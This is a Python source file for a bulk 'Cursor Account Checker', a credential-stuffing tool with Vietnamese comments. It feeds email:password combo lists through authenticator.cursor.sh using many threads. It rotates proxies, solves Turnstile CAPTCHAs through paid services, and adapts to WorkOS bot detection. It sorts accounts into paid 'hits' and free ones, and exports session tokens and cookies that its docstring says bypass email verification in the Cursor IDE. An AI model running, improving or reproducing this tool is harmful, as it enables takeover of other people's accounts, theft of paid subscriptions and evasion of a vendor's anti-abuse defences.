"""
Cursor Account Checker v1.0
============================
Tool check tai khoan Cursor hang loat - login + doc plan info.

Features:
  - Login qua authenticator.cursor.sh (WorkOS + Next.js server actions)
  - Ho tro Turnstile: yeatcloud / nocaptchaai / captchasonic / capsolver / 2captcha / none
  - Proxy rotation + cooldown + lock per-proxy
  - Multi-thread (--bots)
  - Multi-pass (--passes) for RETRY + ERROR
  - Token mode (--tokens): check bang token co san thay vi login
  - Auto pause when retry rate high (avoid IP spam)

Usage:
    python checker.py --bots 30
    python checker.py --captcha capsolver --captcha-key KEY --bots 20
    python checker.py --tokens tokens.txt --bots 50
    python checker.py --proxies proxies.txt --passes 3 --bots 30
    python checker.py --accounts results/retry.txt --bots 30
"""

import os
import sys
import re
import time
import threading
import argparse
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====================== LOGGING ======================
logging.basicConfig(level=logging.WARNING, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("checker")

# ====================== IMPORTS ======================
from config import (
    BASE_DIR, DEFAULT_ACCOUNTS, DEFAULT_PROXIES, DEFAULT_TOKENS, OUT_DIR,
    MAX_PROXY_SWITCH, TIMEOUT, RETRY_CATEGORIES, MARKERS, COLORS, RESET,
    DEFAULT_CAPTCHA_SOLVER, MAX_RETRY_ROUNDS,
)
from proxy_pool import ProxyPool
from captcha_solvers import get_solver, CaptchaError
from cursor_auth import CursorAuth, get_account_info


def _format_export(token):
    """Format token -> AccessToken + MachineId + Cookie (de dung cho Cursor IDE).

    token = WorkosCursorSessionToken = 'sub::jwt' (hoac chi jwt).
    Cursor IDE can: AccessToken (jwt), MachineId (uuid), Cookie (WorkosCursorSessionToken=...).
    Dung token/cookie nay import vao IDE se BYPASS buoc xac minh email (vi da la session auth).
    """
    import uuid as _uuid
    import urllib.parse as _up
    jwt = token.split("::", 1)[1] if "::" in token else token
    machine_id = str(_uuid.uuid4())
    cookie_val = _up.quote(token, safe="")
    return (f"AccessToken={jwt} | MachineId={machine_id} | "
            f"Cookie=WorkosCursorSessionToken={cookie_val}")

# ====================== STATS ======================
print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()
stats = {
    "HIT": 0, "FREE": 0, "FAIL": 0, "RETRY": 0,
    "ERROR": 0, "BADFORMAT": 0, "CUSTOM": 0, "DUPLICATE": 0,
    "DONE": 0, "TOTAL": 0,
}

# ====================== 404 GUARD (Cursor doi action-hash) ======================
# Cursor redeploy ~tuan/lan -> ACTION_EMAIL stale -> email step tra 404 hang loat,
# bi ghi nham thanh FAIL. Guard: 10 lien tiep = dung ngay + huong dan recapture.
_404_STREAK = {"n": 0}
_404_LOCK = threading.Lock()
_404_LIMIT = 10

def _check_404_streak(category, info):
    """Tra ve True neu tool nen DUNG (stale hash)."""
    if category == "FAIL" and "[404]" in info:
        with _404_LOCK:
            _404_STREAK["n"] += 1
            n = _404_STREAK["n"]
            if n == _404_LIMIT:
                return True   # dump len main thread in banner + exit
    else:
        with _404_LOCK:
            _404_STREAK["n"] = 0
    return False


# ====================== EMAIL REGEX ======================
EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")

def is_valid_email(email):
    return bool(EMAIL_REGEX.match(email))


# ====================== OUTPUT ======================
def ensure_out_dir():
    """Moi lan chay = 1 folder con rieng trong results/ (co ngay gio).

    vd: results/run-20260831-1530/  -> khong ghi de ket qua lan chay truoc.
    """
    global OUT_DIR
    ts = time.strftime("%Y%m%d-%H%M%S")
    OUT_DIR = os.path.join(OUT_DIR, f"run-{ts}")
    Path(OUT_DIR).mkdir(parents=True, exist_ok=True)


def clear_results():
    """Khong can xoa — moi run co folder rieng (de ham nay de bao luong compat)."""
    pass


def write_result(category, line):
    with file_lock:
        fname = {
            "TERMINAL": "terminal.txt",
            "HIT": "hits.txt", "FREE": "free.txt", "RETRY": "retry.txt",
            "FAIL": "fail.txt", "ERROR": "error.txt",
            "BADFORMAT": "badformat.txt", "CUSTOM": "custom.txt",
            "DUPLICATE": "duplicate.txt",
        }.get(category, "other.txt")
        with open(os.path.join(OUT_DIR, fname), "a", encoding="utf-8") as f:
            f.write(line + "\n")


# 2026-10-30: radar-challenge WorkOS = FLAG THEO EMAIL (verify: email moi qua IP nha
# chay sach; acc semih radar x4 qua 3 proxy + IP nha + browser that). Acc da flag
# khong save bang IP/fingerprint -> radar >=2 lan trong run => TERMINAL, khong retry.
_radar_seen = {}


def check_via_login(email, password, proxy_pool, captcha_solver, use_proxy):
    """Login workflow. Returns (category, info_str)."""
    if not is_valid_email(email):
        return "BADFORMAT", f"bad email format: {email}"

    if not use_proxy or not proxy_pool:
        return _login_once(email, password, None, None, captcha_solver)

    last_err = None
    for switch in range(MAX_PROXY_SWITCH):
        p = proxy_pool.checkout(timeout=30)
        if not p:
            return _login_once(email, password, None, None, captcha_solver)
        try:
            cat, info = _login_once(email, password, p, p, captcha_solver)
        except Exception as e:
            cat, info = "ERROR", f"exception: {e}"
        info_l = info.lower()
        # Doi proxy khi: network chet, CF 403 (no session id), radar, tunnel timeout.
        # KHONG doi proxy khi FAIL/HIT/FREE/CUSTOM (ket qua that, khong phai IP).
        switchable = (
            "network" in info_l
            or "proxy" in info_l
            or "exception" in info_l
            or "no authorization_session_id" in info_l
            or "radar" in info_l
            or "connect" in info_l
            or "timeout" in info_l
        )
        if "radar" in info_l:
            _radar_seen[email] = _radar_seen.get(email, 0) + 1
            if _radar_seen[email] >= 2:
                proxy_pool.checkin(p, failed=True)
                return "TERMINAL", f"radar x{_radar_seen[email]} (flag theo email, khong retry): {info}"
        if cat in ("ERROR", "RETRY") and switchable:
            proxy_pool.checkin(p, failed=True)
            last_err = info
            continue
        proxy_pool.checkin(p, failed=(cat in ("ERROR", "RETRY")))
        return cat, info
    return "ERROR", f"exhausted {MAX_PROXY_SWITCH} proxies: {last_err}"


def _login_once(email, password, proxy_obj, p_raw, captcha_solver):
    """Single login attempt with auto captcha detection + solve if solver available."""
    auth = CursorAuth(proxy_obj=proxy_obj, captcha_solver=captcha_solver)
    
    # Auto-detect & solve captcha if solver is available
    auto_solve = captcha_solver is not None and captcha_solver.name not in ("none",)
    result = auth.login(email, password, auto_solve_captcha=auto_solve)

    if result["ok"] and result.get("token"):
        token = result["token"]
        info = get_account_info(token, proxy_obj=proxy_obj)
        if info["ok"]:
            plan = info.get("plan", "Free")
            email_found = info.get("email") or email
            usage = info.get("usage", "")
            # Export token / access token / machine id / cookie (de dung cho Cursor IDE)
            export = _format_export(token)
            details = (f"Plan={plan} | Email={email_found} | "
                       f"{info['membershipType']}/{info['subscriptionStatus']} | {usage}"
                       f"{(' | ' + info['renew']) if info.get('renew') else ''} | {export}")
            if plan.lower() in ("free", "unknown", ""):
                return "FREE", details
            return "HIT", details
        else:
            # Login OK nhung doc plan fail (token 401/network) -> ERROR de retry
            # (khong phai FREE that, retry lai lay token moi se ok)
            return "ERROR", f"login OK but plan-check fail: {info.get('msg','')}"

    status = result.get("status", "error")
    msg = result.get("msg", "")
    map_category = {
        "bad_pass": "FAIL",
        "rate": "RETRY",
        "need_2fa": "CUSTOM",
        "captcha": "RETRY",
        "radar": "RETRY",   # WorkOS bot detection -> retry voi proxy/IP khac
    }
    cat = map_category.get(status, "RETRY")
    return cat, f"login {status}: {msg}"


# ====================== CORE CHECK (TOKEN MODE) ======================
def check_via_token(token_line, proxy_pool, use_proxy):
    """Check via existing token (no login)."""
    line = token_line.strip()
    parts = line.split(":", 2)
    if len(parts) >= 3:
        email, password, token = parts
    elif len(parts) == 2:
        email, token = parts
        password = ""
    else:
        token = line
        email = ""
        password = ""

    if "@" in email and not is_valid_email(email):
        return "BADFORMAT", f"bad email format: {email}"

    if not use_proxy or not proxy_pool:
        return _token_once(email, password, token, None)

    last_err = None
    for switch in range(MAX_PROXY_SWITCH):
        p = proxy_pool.checkout(timeout=30)
        if not p:
            return _token_once(email, password, token, None)
        try:
            cat, info = _token_once(email, password, token, p)
        except Exception as e:
            cat, info = "ERROR", f"exception: {e}"
        if cat == "ERROR":
            proxy_pool.checkin(p, failed=True)
            last_err = info
            continue
        proxy_pool.checkin(p)
        return cat, info
    return "ERROR", f"exhausted {MAX_PROXY_SWITCH} proxies: {last_err}"


def _token_once(email, password, token, proxy_obj):
    """Single token check."""
    info = get_account_info(token, proxy_obj=proxy_obj)
    if info["ok"]:
        plan = info.get("plan", "Free")
        email_found = info.get("email") or email
        usage = info.get("usage", "")
        export = _format_export(token)
        details = (f"Plan={plan} | Email={email_found} | "
                   f"{info['membershipType']}/{info['subscriptionStatus']} | {usage}"
                   f"{(' | ' + info['renew']) if info.get('renew') else ''} | {export}")
        if plan.lower() in ("free", "unknown", ""):
            return "FREE", details
        return "HIT", details
    msg = info.get("msg", "")
    if "network" in msg.lower() or "proxy" in msg.lower():
        return "ERROR", msg
    if "204" in msg or "token" in msg.lower() or "401" in msg:
        return "FAIL", f"token invalid: {msg}"
    return "ERROR", msg


# ====================== WORKER ======================
def worker(line, proxy_pool, captcha_solver, use_proxy, pass_num=1, mode="login"):
    """Worker thread."""
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if " | " in line:
        line = line.split(" | ", 1)[0].strip()
    if ":" not in line:
        return None

    parts = line.split(":", 2)
    if len(parts) >= 2:
        email, password = parts[0], parts[1]
    else:
        return None

    if mode == "token":
        category, info = check_via_token(line, proxy_pool, use_proxy)
    else:
        category, info = check_via_login(email, password, proxy_pool, captcha_solver, use_proxy)

    with stats_lock:
        stats["DONE"] += 1
        if category in stats:
            stats[category] += 1
        done = stats["DONE"]
        total = stats["TOTAL"]

    if category in ("HIT", "FREE"):
        out_line = f"{email}:{password} | {info}"
    else:
        out_line = f"{email}:{password} | {category} - {info}"

    write_result(category, out_line)

    # Guard: 10 acc lien tiep FAIL[404] = Cursor doi action-hash -> DUNG tool
    if _check_404_streak(category, info):
        with print_lock:
            print(f"\n\033[91m{'='*60}")
            print(f"[DUNG!] { _404_LIMIT } acc lien tiep FAIL [404] o email step.")
            print(f"  -> Cursor vua doi action-hash (redeploy). Ket qua tu day tro di la RAC.")
            print(f"  FIX: python capture_patch.py  (lay hash moi, in ra 'captured action IDs')")
            print(f"       paste 2 hash vao config.py (ACTION_EMAIL / ACTION_PASSWORD) roi chay lai.")
            print(f"  (ket qua truoc do van giu nguyen trong folder run)\033[0m")
        import os as _os
        _os._exit(2)

    with print_lock:
        done_pct = done * 100 // total if total else 0
        marker = MARKERS.get(category, "[?]")
        color = COLORS.get(category, "")
        short_info = info if category in ("HIT", "FREE") else ""
        # Tag solver CHI hien khi captcha thuc su duoc solve trong thread nay
        # (acc chet o email step (radar/404/no-session) -> khong tag, de phan biet)
        solver_name = None
        if captcha_solver is not None and category in ("HIT", "FREE", "FAIL", "CUSTOM"):
            try:
                solver_name = captcha_solver.last_solver_name()
            except Exception:
                solver_name = None
        solver_tag = f"\033[90m<{solver_name}>\033[0m " if solver_name else ""
        print(f"{solver_tag}{color}{marker}{RESET} [{done}/{total}] {done_pct}% | {email} | {short_info}")

    return (category, line, info)


# ====================== PROGRESS ======================
def progress_printer():
    while True:
        time.sleep(5)
        with stats_lock:
            s = dict(stats)
        with print_lock:
            print(f"\033[90m--- Done {s['DONE']}/{s['TOTAL']} | "
                  f"HIT={s['HIT']} FREE={s['FREE']} RETRY={s['RETRY']} "
                  f"FAIL={s['FAIL']} ERROR={s['ERROR']} CUSTOM={s['CUSTOM']} "
                  f"BAD={s['BADFORMAT']} DUP={s['DUPLICATE']} ---{RESET}")


# ====================== MAIN ======================
def main():
    ap = argparse.ArgumentParser(
        description="Cursor Account Checker - Bulk check Cursor accounts",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python checker.py --bots 30
  python checker.py --captcha capsolver --captcha-key KEY --bots 20
  python checker.py --tokens tokens.txt --bots 50
  python checker.py --proxies proxies.txt --passes 3 --bots 30
  python checker.py --accounts results/retry.txt --bots 30
        """,
    )
    ap.add_argument("--accounts", default=DEFAULT_ACCOUNTS,
                    help="Accounts file email:password (default: %(default)s)")
    ap.add_argument("--tokens", default="",
                    help="Tokens file email:password:token - check without login")
    ap.add_argument("--proxies", default=DEFAULT_PROXIES,
                    help="Proxies file (default: %(default)s)")
    ap.add_argument("--no-proxy", action="store_true", help="Run without proxy")
    ap.add_argument("--bots", type=int, default=30, help="Number of threads (default: %(default)s)")
    ap.add_argument("--passes", type=int, default=MAX_RETRY_ROUNDS + 1,
                    help=f"Total passes = pass 1 + retry (default: %(default)s = 1 + {MAX_RETRY_ROUNDS} retry)")
    ap.add_argument("--retries", type=int, default=MAX_RETRY_ROUNDS,
                    help=f"So retry round toi da sau pass 1 (default: %(default)s = {MAX_RETRY_ROUNDS}). Override --passes")
    ap.add_argument("--captcha", default=DEFAULT_CAPTCHA_SOLVER,
                    help="Chain solver, phay ngan cach. Section trong keys.txt bi bo qua (default: %(default)s)")
    ap.add_argument("--captcha-key", default="", help="API key for captcha solver")
    args = ap.parse_args()

    # ============ MODE ============
    if args.tokens:
        mode = "token"
        accounts_path = args.tokens
        print("[+] MODE: Token (check via session token, no login)")
    else:
        mode = "login"
        accounts_path = args.accounts
        print("[+] MODE: Login (email + password)")

    # ============ LOAD ACCOUNTS ============
    with open(accounts_path, "r", encoding="utf-8", errors="ignore") as f:
        all_accounts = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    print(f"[+] Loaded {len(all_accounts)} accounts")

    # ============ PROXY ============
    proxy_pool = None
    if not args.no_proxy:
        if os.path.exists(args.proxies):
            with open(args.proxies, "r", encoding="utf-8", errors="ignore") as f:
                proxy_lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            proxy_pool = ProxyPool(proxy_lines)
            print(f"[+] Loaded {proxy_pool.count()} proxies")
        else:
            print("[!] Proxy file not found, running without proxy")
    else:
        print("[+] Running without proxy")
    use_proxy = proxy_pool is not None

    # ============ CAPTCHA ============
    captcha_solver = None
    captcha_name = args.captcha.lower().strip()
    if captcha_name != "none":
        try:
            captcha_solver = get_solver(captcha_name, args.captcha_key)
            print(f"[+] Captcha solver: {captcha_solver.name}")
        except ValueError as e:
            print(f"[!] {e} -> fallback to 'none'")
            captcha_solver = get_solver("none")
    else:
        captcha_solver = get_solver("none")
        print("[*] Captcha: none (try without captcha first)")

    # ============ OUTPUT DIR ============
    ensure_out_dir()
    clear_results()
    print(f"[+] Output: {OUT_DIR}")

    total_start = time.time()

    # ============ PRE-FILTER: format + duplicate (user:pass) ============
    # Duplicate = trung CA user + password (giong Grok/combo tool).
    # Cung email khac pass van giu. Lan dau giu, lan 2+ -> duplicate.txt.
    valid_accounts = []
    bad_count = 0
    dup_count = 0
    seen_combo = set()
    bad_path = os.path.join(OUT_DIR, "badformat.txt")
    dup_path = os.path.join(OUT_DIR, "duplicate.txt")
    with open(bad_path, "w", encoding="utf-8") as bf, open(dup_path, "w", encoding="utf-8") as df:
        for line in all_accounts:
            line_s = line.strip()
            if not line_s or line_s.startswith("#"):
                continue
            if " | " in line_s:
                line_s = line_s.split(" | ", 1)[0].strip()
            if ":" not in line_s:
                continue
            user, password = line_s.split(":", 1)
            user = user.strip()
            password = password.strip()
            if "@" in user and not is_valid_email(user):
                bf.write(f"{line_s} | BADFORMAT - bad email format: {user}\n")
                bad_count += 1
                with stats_lock:
                    stats["BADFORMAT"] += 1
                    stats["DONE"] += 1
                continue
            combo_key = (user.lower(), password)
            if combo_key in seen_combo:
                df.write(f"{line_s} | DUPLICATE - same user:pass already queued\n")
                dup_count += 1
                with stats_lock:
                    stats["DUPLICATE"] += 1
                    stats["DONE"] += 1
                continue
            seen_combo.add(combo_key)
            valid_accounts.append(f"{user}:{password}" if password else line_s)

    print(f"\033[90m[PRE-FILTER] {bad_count} bad format -> badformat.txt")
    print(f"[PRE-FILTER] {dup_count} duplicate (same user:pass) -> duplicate.txt")
    print(f"[PRE-FILTER] {len(valid_accounts)} unique combos -> checking\033[0m\n")

    all_accounts = valid_accounts

    with stats_lock:
        stats["TOTAL"] = len(all_accounts) + stats["DONE"]

    # ============ PASS 1 ============
    print(f"[+] Bots: {args.bots}")
    print(f"[+] Retry rounds: up to {args.retries} (retry RETRY+ERROR moi round)")
    print(f"[+] PASS 1: Check {len(all_accounts)} accounts...\n")

    pt = threading.Thread(target=progress_printer, daemon=True)
    pt.start()

    CHUNK_SIZE = 500
    PAUSE_THRESHOLD = 0.35
    PAUSE_SEC = 120

    pending_retry = []
    total_valid = len(all_accounts)

    for chunk_start in range(0, total_valid, CHUNK_SIZE):
        chunk = all_accounts[chunk_start:chunk_start + CHUNK_SIZE]
        chunk_num = chunk_start // CHUNK_SIZE + 1
        total_chunks = (total_valid + CHUNK_SIZE - 1) // CHUNK_SIZE

        if chunk_num > 1:
            with stats_lock:
                done_so_far = stats["DONE"] - stats["BADFORMAT"] - stats["CUSTOM"]
                retry_so_far = stats["RETRY"]
            if done_so_far > 100:
                retry_rate = retry_so_far / done_so_far
                if retry_rate > PAUSE_THRESHOLD:
                    print(f"\n\033[93m[AUTO-PAUSE] Retry rate {retry_rate*100:.0f}% > {PAUSE_THRESHOLD*100:.0f}% -> Waiting {PAUSE_SEC}s for IP reset\033[0m\n")
                    if proxy_pool:
                        proxy_pool.reset_bad()
                    time.sleep(PAUSE_SEC)

        print(f"\033[90m[CHUNK {chunk_num}/{total_chunks}] Checking {len(chunk)} acc (from {chunk_start+1} to {chunk_start+len(chunk)})\033[0m")

        with ThreadPoolExecutor(max_workers=args.bots) as ex:
            futures = [
                ex.submit(worker, line, proxy_pool, captcha_solver, use_proxy, 1, mode)
                for line in chunk
            ]
            for fut in as_completed(futures):
                res = fut.result()
                if res and res[0] in RETRY_CATEGORIES:
                    pending_retry.append(res[1])

    print(f"\n\033[96m[PASS 1] Done. Need retry: {len(pending_retry)} acc\033[0m")

    # ============ RETRY ROUNDS 1..N ============
    # Moi round: lay toan bo RETRY+ERROR con lai, check lai, ghi lai.
    # Dung khi: het pending_retry HOAC dat args.retries round.
    for round_num in range(1, args.retries + 1):
        if not pending_retry:
            print(f"\n\033[96m[RETRY] Het acc can retry. Stop.\033[0m")
            break
        wait_sec = 90
        print(f"\n\033[96m[RETRY ROUND {round_num}/{args.retries}] Waiting {wait_sec}s for IP reset...\033[0m")
        time.sleep(wait_sec)

        retry_list = pending_retry
        pending_retry = []

        with stats_lock:
            stats["TOTAL"] = stats["DONE"] + len(retry_list)

        # Xoa retry.txt + error.txt cu -> chi ghi acc con loi o round nay
        for fname in ["retry.txt", "error.txt"]:
            p = os.path.join(OUT_DIR, fname)
            if os.path.exists(p):
                os.remove(p)
        with stats_lock:
            stats["RETRY"] = 0
            stats["ERROR"] = 0

        print(f"[RETRY ROUND {round_num}/{args.retries}] Recheck {len(retry_list)} acc (RETRY+ERROR, fresh proxies)...\n")

        if proxy_pool:
            proxy_pool.reset_bad()

        with ThreadPoolExecutor(max_workers=args.bots) as ex:
            futures = [
                ex.submit(worker, line, proxy_pool, captcha_solver, use_proxy, round_num + 1, mode)
                for line in retry_list
            ]
            for fut in as_completed(futures):
                res = fut.result()
                if res and res[0] in RETRY_CATEGORIES:
                    pending_retry.append(res[1])

        print(f"\n\033[96m[RETRY ROUND {round_num}/{args.retries}] Done. Still need retry: {len(pending_retry)}\033[0m")
    else:
        if pending_retry:
            print(f"\n\033[93m[RETRY] Da het {args.retries} round. Con {len(pending_retry)} acc chua xac dinh (luu retry.txt).\033[0m")

    elapsed = time.time() - total_start

    # ============ FINAL ============
    print(f"\n{'='*60}")
    print(f"Completed in {elapsed:.1f}s ({elapsed/60:.1f} min)")
    print(f"{'='*60}")
    with stats_lock:
        s = dict(stats)
    print(f"  HIT      (has plan):  {s['HIT']:>6}")
    print(f"  FREE     (free):      {s['FREE']:>6}")
    print(f"  FAIL     (bad pass):  {s['FAIL']:>6}")
    print(f"  RETRY    (remaining): {s['RETRY']:>6}")
    print(f"  ERROR    (network):   {s['ERROR']:>6}")
    print(f"  CUSTOM   (2FA/OTP):   {s['CUSTOM']:>6}")
    print(f"  BADFORMAT:            {s['BADFORMAT']:>6}")
    print(f"  DUPLICATE:            {s.get('DUPLICATE', 0):>6}")
    print(f"  Total checked:        {s['DONE']:>6}")
    print(f"\nResults saved to: {OUT_DIR}")
    print(f"  -> hits.txt      (HIT - has plan)")
    print(f"  -> free.txt      (FREE tier)")
    print(f"  -> retry.txt     (QUOTA - rerun)")
    print(f"  -> fail.txt      (bad pass/email)")
    print(f"  -> error.txt     (network/proxy error)")
    print(f"  -> badformat.txt (bad email format)")
    print(f"  -> duplicate.txt (same user:pass, kept first)")
    print(f"  -> custom.txt    (needs 2FA/OTP)")
    print(f"\n  [TIP] Rerun retry/error (folder run nay):")
    print(f'    python checker.py --accounts "{OUT_DIR}\\retry.txt" --bots 12')


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user (Ctrl+C)")
        sys.exit(1)
